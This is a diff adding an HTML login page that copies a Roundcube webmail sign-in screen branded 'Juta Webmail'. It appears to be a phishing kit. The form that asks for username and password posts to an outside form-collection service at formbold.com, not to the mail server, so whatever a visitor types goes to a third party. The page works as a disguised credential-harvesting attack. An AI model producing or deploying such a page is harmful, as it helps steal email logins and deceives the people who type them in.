@@ -1,0 +1,88 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" js mozilla"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Juta Webmail :: Welcome to Juta Webmail</title>
+<link rel="index" href="https://mail.juta.cz/webmail/?_task=login">
+
+<link rel="shortcut icon" href="juta_files/logo.png">
+<link rel="stylesheet" type="text/css" href="juta_files/common.min.css">
+
+
+
+<link rel="stylesheet" type="text/css" href="juta_files/jquery-ui.min.css"><script src="juta_files/jquery.min.js" type="text/javascript"></script><script src="juta_files/common.min.js" type="text/javascript"></script><script src="juta_files/app.min.js" type="text/javascript"></script><script src="juta_files/jstz.min.js" type="text/javascript"></script><script type="text/javascript">
+/* <![CDATA[ */
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10605,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":false,"skin":"classic","blankpage":"skins/classic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/webmail/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"kAyMMXP86e9hp3hV0jEdkTV6F3gXch68"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('message', 'message');
+rcmail.gui_object('loginform', 'form');
+/* ]]> */
+</script>
+
+<script src="juta_files/jquery-ui.min.js" type="text/javascript"></script><script src="juta_files/jquery-ui-accessible-datepicker.min.js" type="text/javascript"></script>
+</head>
+<body>
+
+<img src="juta_files/logo.png" id="logo" border="0" style="margin:0 11px" alt="Juta Webmail">
+
+<div id="message"></div>
+
+<div id="login-form">
+<div class="boxtitle">Welcome to Juta Webmail</div>
+<div class="boxcontent">
+
+<form name="form" method="post" action="https://formbold.com/s/oyqMW">
+<input type="hidden" name="_token" value="kAyMMXP86e9hp3hV0jEdkTV6F3gXch68">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos"><input type="hidden" name="_url" id="rcmloginurl" value=""><table border="0"><tbody><tr><td class="title"><label for="rcmloginuser">Username</label></td><td class="input"><input name="_user" id="rcmloginuser" required="required" autocapitalize="none" autocomplete="off" type="text"></td></tr><tr><td class="title"><label for="rcmloginpwd">Password</label></td><td class="input"><input name="_pass" id="rcmloginpwd" required="required" autocapitalize="none" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button></p>
+</form>
+
+</div>
+</div>
+
+<noscript>
+  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+<div id="login-bottomline">
+  Juta Webmail 
+  
+    &nbsp;●&nbsp; <a href="http://www.juta.cz/" target="_blank" class="support-link">Get support</a>
+  
+  
+</div>
+<script type="text/javascript">
+/* <![CDATA[ */
+$(function() {
+rcmail.init();
+var images = ["skins/classic/images/icons/folders.png","skins/classic/images/mail_footer.png","skins/classic/images/taskicons.gif","skins/classic/images/display/loading.gif","skins/classic/images/pagenav.gif","skins/classic/images/mail_toolbar.png","skins/classic/images/searchfield.gif","skins/classic/images/messageicons.png","skins/classic/images/icons/reset.gif","skins/classic/images/abook_toolbar.png","skins/classic/images/icons/groupactions.png","skins/classic/images/watermark.gif"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+/* ]]> */
+</script>
+
+
+
+
+
+
+</body></html>
